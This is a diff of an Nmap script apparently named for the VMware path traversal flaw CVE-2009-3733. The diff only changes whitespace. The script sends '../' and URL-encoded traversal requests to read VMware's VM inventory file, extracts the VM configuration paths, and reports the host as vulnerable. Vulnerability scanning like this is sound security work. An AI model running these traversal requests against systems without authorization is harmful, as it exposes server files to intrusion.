@@ -35,45 +35,45 @@ categories = {"vuln", "safe"}
 portrule = shortport.port_or_service({80, 443, 8222,8333}, {"http", "https"})
 
 local function get_file(host, port, path)
-	local file
+  local file
 
-	-- Replace spaces in the path with %20
-	path = string.gsub(path, " ", "%%20")
+  -- Replace spaces in the path with %20
+  path = string.gsub(path, " ", "%%20")
 
-	-- Try both ../ and %2E%2E/
-	file = "/sdk/../../../../../../" .. path
+  -- Try both ../ and %2E%2E/
+  file = "/sdk/../../../../../../" .. path
 
-	local result = http.get( host, port, file)
-	if(result['status'] ~= 200 or result['content-length'] == 0) then
-		file = "/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/" .. path
-		result = http.get( host, port, file)
+  local result = http.get( host, port, file)
+  if(result['status'] ~= 200 or result['content-length'] == 0) then
+    file = "/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/" .. path
+    result = http.get( host, port, file)
 
-		if(result['status'] ~= 200 or result['content-length'] == 0) then
-			return false, "Couldn't download file: " .. path
-		end
-	end
+    if(result['status'] ~= 200 or result['content-length'] == 0) then
+      return false, "Couldn't download file: " .. path
+    end
+  end
 
-	return true, result.body, file
+  return true, result.body, file
 end
 
 local function fake_xml_parse(str, tag)
-	local result = {}
-	local index, tag_start, tag_end
+  local result = {}
+  local index, tag_start, tag_end
 
-	-- Lowercase the 'body' we're searching
-	local lc = string.lower(str)
-	-- Lowrcase the tag
-	tag = string.lower(tag)
+  -- Lowercase the 'body' we're searching
+  local lc = string.lower(str)
+  -- Lowrcase the tag
+  tag = string.lower(tag)
 
-	-- This loop does some ugly pattern-based xml parsing
-	index, tag_start = string.find(lc, "<" .. tag .. ">")
-	while index do
-		tag_end, index = string.find(lc, "</" .. tag .. ">", index)
-		table.insert(result, string.sub(str, tag_start + 1, tag_end - 1)) -- note: not lowercase
-		index, tag_start = string.find(lc, "<" .. tag .. ">", index)
-	end
+  -- This loop does some ugly pattern-based xml parsing
+  index, tag_start = string.find(lc, "<" .. tag .. ">")
+  while index do
+    tag_end, index = string.find(lc, "</" .. tag .. ">", index)
+    table.insert(result, string.sub(str, tag_start + 1, tag_end - 1)) -- note: not lowercase
+    index, tag_start = string.find(lc, "<" .. tag .. ">", index)
+  end
 
-	return result
+  return result
 end
 
 --local function parse_vmware_conf(str, field)
@@ -91,51 +91,51 @@ end
 --end
 
 local function go(host, port)
-	local result, body
-	local files
+  local result, body
+  local files
 
-	-- Try to download the file
-	result, body = get_file(host, port, "/etc/vmware/hostd/vmInventory.xml");
-	-- It failed -- probably not vulnerable
-	if(not(result)) then
-		return false, "Couldn't download file: " .. body
-	end
+  -- Try to download the file
+  result, body = get_file(host, port, "/etc/vmware/hostd/vmInventory.xml");
+  -- It failed -- probably not vulnerable
+  if(not(result)) then
+    return false, "Couldn't download file: " .. body
+  end
 
-	-- Check if the file contains the proper XML
-	if(string.find(string.lower(body), "configroot") == nil) then
-		return false, "Server didn't return XML -- likely not vulnerable."
-	end
+  -- Check if the file contains the proper XML
+  if(string.find(string.lower(body), "configroot") == nil) then
+    return false, "Server didn't return XML -- likely not vulnerable."
+  end
 
-	files = fake_xml_parse(body, "vmxcfgpath")
+  files = fake_xml_parse(body, "vmxcfgpath")
 
-	if(#files == 0) then
-		return true, {"No VMs appear to be installed"}
-	end
+  if(#files == 0) then
+    return true, {"No VMs appear to be installed"}
+  end
 
-	-- Process each of the .vmx files if verbosity is on
---	if(nmap.verbosity() > 1) then
---		local result, file = get_file(host, port, files[1])
---io.write(nsedebug.tostr(file))
---	end
+  -- Process each of the .vmx files if verbosity is on
+  --if(nmap.verbosity() > 1) then
+  --  local result, file = get_file(host, port, files[1])
+  --  io.write(nsedebug.tostr(file))
+  --end
 
-	return true, files
+  return true, files
 end
 
 action = function(host, port)
-	-- Try a standard ../ path
-	local status, result = go(host, port)
+  -- Try a standard ../ path
+  local status, result = go(host, port)
 
-	if(not(status)) then
-		return nil
-	end
+  if(not(status)) then
+    return nil
+  end
 
-	local response = {}
-	table.insert(response, "VMWare path traversal (CVE-2009-3733): VULNERABLE")
+  local response = {}
+  table.insert(response, "VMWare path traversal (CVE-2009-3733): VULNERABLE")
 
-	if(nmap.verbosity() > 1) then
-		table.insert(response, result)
-	end
+  if(nmap.verbosity() > 1) then
+    table.insert(response, result)
+  end
 
-	return stdnse.format_output(true, response)
+  return stdnse.format_output(true, response)
 end
 
